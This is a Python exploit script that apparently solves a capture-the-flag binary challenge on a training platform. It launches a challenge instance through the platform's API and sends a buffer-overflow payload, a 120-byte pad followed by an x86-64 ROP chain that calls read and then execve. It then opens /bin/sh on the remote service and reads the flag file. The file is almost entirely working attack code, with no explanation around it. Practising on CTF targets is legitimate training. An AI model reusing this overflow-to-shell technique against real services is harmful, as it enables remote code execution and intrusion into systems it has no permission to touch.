import sys, json, re, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

POP_RDI = 0x40206F
POP_RSI = 0x40A0DE
POP_RDX_RBX = 0x486BBB
POP_RAX = 0x4518E7
SYSCALL = 0x41B406
BSS = 0x4C9360


def p64(x):
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)


chain = b""
# read(0, BSS, 16)
chain += p64(POP_RDI) + p64(0)
chain += p64(POP_RSI) + p64(BSS)
chain += p64(POP_RDX_RBX) + p64(16) + p64(0)
chain += p64(POP_RAX) + p64(0)
chain += p64(SYSCALL)
# execve(BSS, 0, 0)
chain += p64(POP_RDI) + p64(BSS)
chain += p64(POP_RSI) + p64(0)
chain += p64(POP_RDX_RBX) + p64(0) + p64(0)
chain += p64(POP_RAX) + p64(59)
chain += p64(SYSCALL)
payload = b"A" * 120 + chain
print("payload len:", len(payload))

cy = CyLab(delay=1.0)
cy.login()
cy.req("PUT", "/api/challenges/90/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/90/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"nc\s+([A-Za-z0-9.\-]+)\s+(\d+)", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
s = socket.create_connection((host, port), timeout=20)
s.settimeout(8)
time.sleep(0.4)
try:
    s.recv(8192)
except Exception:
    pass
s.sendall(b"84\n")
time.sleep(0.6)
r = b""
try:
    r = s.recv(8192)
except Exception:
    pass
print("apres 84:", r[:150])
s.sendall(payload + b"\n")
time.sleep(0.8)
try:
    s.recv(8192)
except Exception:
    pass
s.sendall(b"/bin/sh\x00\n")
time.sleep(1.2)
s.sendall(b"cat flag.txt; cat flag\n")
time.sleep(2.0)
out = b""
try:
    while True:
        c = s.recv(65536)
        if not c:
            break
        out += c
except Exception:
    pass
txt = out.decode("utf-8", "replace")
print("=== SHELL ===")
print(txt[:600])
f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
print("FLAG:", f.group(0) if f else "non trouve")
s.close()
